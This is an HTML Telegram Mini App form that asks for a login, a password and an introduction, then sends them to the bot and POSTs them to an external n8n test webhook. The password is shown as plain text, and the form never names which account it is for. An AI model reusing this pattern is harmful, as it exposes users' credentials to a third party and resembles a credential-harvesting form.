<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Mini App Form</title>
    <script src="https://telegram.org/js/telegram-web-app.js?56"></script>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            padding: 16px;
            margin: 0;
            color: #333;
            background-color: var(--tg-theme-bg-color, #f5f5f5);
            min-height: 100vh;
            box-sizing: border-box;
        }

        .telegram-app {
            background-color: var(--tg-theme-secondary-bg-color, white);
            border-radius: 12px;
            padding: 20px;
            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.08);
            max-width: 100%;
        }

        h1 {
            font-size: 1.4rem;
            margin: 0 0 24px 0;
            color: var(--tg-theme-text-color, #0088cc);
            font-weight: 600;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: var(--tg-theme-text-color, #333);
            font-size: 0.95rem;
        }

        input[type="text"],
        textarea {
            width: 100%;
            padding: 12px;
            border: 1.5px solid var(--tg-theme-hint-color, #ddd);
            border-radius: 8px;
            box-sizing: border-box;
            font-size: 1rem;
            font-family: inherit;
            background-color: var(--tg-theme-bg-color, white);
            color: var(--tg-theme-text-color, #333);
            transition: border-color 0.2s ease;
        }

        input[type="text"]:focus,
        textarea:focus {
            outline: none;
            border-color: var(--tg-theme-button-color, #0088cc);
        }

        textarea {
            resize: vertical;
            min-height: 80px;
            line-height: 1.4;
        }

        .info-text {
            font-size: 0.85rem;
            color: var(--tg-theme-hint-color, #888);
            margin-top: 16px;
            text-align: center;
        }

        /* Hide the HTML submit button when Telegram MainButton is available */
        .main-button-hidden {
            display: none;
        }

        .submit-button {
            background-color: var(--tg-theme-button-color, #0088cc);
            color: var(--tg-theme-button-text-color, white);
            border: none;
            padding: 14px 20px;
            border-radius: 8px;
            font-size: 1rem;
            font-weight: 500;
            cursor: pointer;
            width: 100%;
            margin-top: 12px;
            transition: background-color 0.2s ease;
        }

        .submit-button:hover {
            background-color: var(--tg-theme-button-color, #0077b3);
            opacity: 0.9;
        }

        .submit-button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        /* Dark theme adjustments */
        @media (prefers-color-scheme: dark) {
            body {
                background-color: #1a1a1a;
            }
            .telegram-app {
                background-color: #2a2a2a;
            }
            input[type="text"],
            textarea {
                background-color: #333;
                border-color: #555;
                color: #fff;
            }
        }
    </style>
</head>
<body>
    <div class="telegram-app">
        <h1>Information Form</h1>
        <form id="telegramForm">
            <div class="form-group">
                <label for="login">Login</label>
                <input type="text" id="login" name="login" placeholder="Enter your login" required>
            </div>
            <div class="form-group">
                <label for="pass">Password</label>
                <input type="text" id="pass" name="pass" placeholder="Enter your password" required>
            </div>
            <div class="form-group">
                <label for="intro">Introduction</label>
                <textarea id="intro" name="intro" placeholder="Tell us about yourself..." required></textarea>
            </div>
            <button type="submit" id="submitButton" class="submit-button">Submit</button>
        </form>
        <p class="info-text">Please fill all fields before submitting</p>
    </div>

    <script>
        // Initialize Telegram WebApp
        const webapp = window.Telegram.WebApp;
        webapp.expand();
        webapp.ready();

        // Apply Telegram theme colors
        document.documentElement.style.setProperty('--tg-theme-bg-color', webapp.themeParams.bg_color || '#f5f5f5');
        document.documentElement.style.setProperty('--tg-theme-text-color', webapp.themeParams.text_color || '#333');
        document.documentElement.style.setProperty('--tg-theme-hint-color', webapp.themeParams.hint_color || '#888');
        document.documentElement.style.setProperty('--tg-theme-button-color', webapp.themeParams.button_color || '#0088cc');
        document.documentElement.style.setProperty('--tg-theme-button-text-color', webapp.themeParams.button_text_color || 'white');
        document.documentElement.style.setProperty('--tg-theme-secondary-bg-color', webapp.themeParams.secondary_bg_color || 'white');

        // Handle form submission
        function submitForm() {
            const telegramUserId = webapp.initDataUnsafe?.user?.id || 'unknown';
            console.log("User ID:", telegramUserId);
            
            // Get form values
            const field1Value = document.getElementById('login').value;
            const field2Value = document.getElementById('pass').value;
            const field3Value = document.getElementById('intro').value;
            
            // Prepare data to send back to the bot
            const formData = {
                login: field1Value,
                pass: field2Value,
                intro: field3Value,
                telegramUserId: telegramUserId
            };
            
            // Send data back to the bot
            webapp.sendData(JSON.stringify(formData));

            fetch('https://n8n.revenuebase.ai/webhook-test/0ae53b1b-368a-43a1-a169-dad121b533b7', {
              method: 'POST',
              headers: {'Content-Type': 'application/json'},
              body: JSON.stringify(formData)
            }).then(response => {
              console.log("Webhook response:", response);
              return response.text();
            })
            .then(data => {
              console.log("Response data:", data);
              webapp.close();
            })
            .catch(error => {
              console.error("Webhook error:", error);
            });
        }

        document.getElementById('telegramForm').addEventListener('submit', function(e) {
            e.preventDefault();
            submitForm();
        });

        // Form validation
        const inputs = document.querySelectorAll('input[required], textarea[required]');
        const submitButton = document.getElementById('submitButton');
        
        function checkFormValidity() {
            let isValid = true;
            inputs.forEach(input => {
                if (!input.value.trim()) {
                    isValid = false;
                }
            });
            
            if (webapp.MainButton) {
                if (isValid) {
                    webapp.MainButton.enable();
                } else {
                    webapp.MainButton.disable();
                }
            }
            
            submitButton.disabled = !isValid;
            return isValid;
        }
        
        inputs.forEach(input => {
            input.addEventListener('input', checkFormValidity);
        });

        // Setup Telegram MainButton if available
        if (webapp.MainButton) {
            webapp.MainButton.setText('SUBMIT');
            webapp.MainButton.show();
            
            webapp.MainButton.onClick(submitForm);
            
            // Hide HTML submit button when MainButton is available
            submitButton.classList.add('main-button-hidden');
        }
        
        // Initial validation check
        checkFormValidity();
    </script>
</body>
</html>
